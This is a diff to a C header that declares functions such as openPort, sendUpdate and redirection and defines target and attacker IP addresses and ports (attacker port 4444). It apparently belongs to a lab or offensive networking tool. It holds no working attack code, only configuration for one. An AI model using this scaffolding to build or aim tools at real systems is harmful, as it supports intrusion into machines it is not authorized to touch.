@@ -3,12 +3,13 @@
 
 int openPort();
 int sendUpdate();
-void redirection();
+void redirection(int connID);
+void mainMenu(int connID);
 
-#define TARGET_IP "10.0.0.14"
+#define TARGET_IP "192.168.68.107"
 #define TARGET_PORT 8080
 
-#define ATTACKER_IP "10.0.0.8"
+#define ATTACKER_IP "192.168.68.100"
 #define ATTACKER_PORT 4444
 
 #endif
